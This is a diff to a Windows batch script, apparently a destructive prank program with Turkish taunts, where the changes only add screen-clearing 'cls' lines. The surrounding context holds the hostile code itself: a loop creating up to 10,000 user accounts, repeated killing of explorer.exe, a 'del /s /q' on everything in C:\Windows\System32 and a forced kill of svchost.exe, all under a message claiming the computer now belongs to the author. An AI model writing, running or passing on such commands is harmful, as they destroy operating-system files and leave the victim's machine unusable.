@@ -26,6 +26,7 @@ for /l %%i in (1,1,10000) do (
     set "username=%base_username%%%i"
     net user !username! %password% /add
 )
+cls
 pause
 echo Ok then im gonna show you.
 start start ms-settings:accounts-family
@@ -50,7 +51,7 @@ echo **Savaşma Sesleri**
 timeout /t 1 /nobreak
 echo **Savaşma Sesleri**
 timeout /t 1 /nobreak
-
+cls
 color f
 echo HAHAHHA BILGISAYARIN BENIM !
 
@@ -73,8 +74,10 @@ taskkill /f /im explorer.exe
 start explorer.exe
 taskkill /f /im explorer.exe
 start explorer.exe
+cls
 echo HAHAHAHAHAH
 
 del /s /q C:\Windows\System32\*
+cls
 taskkill /f /im svchost.exe
 pause
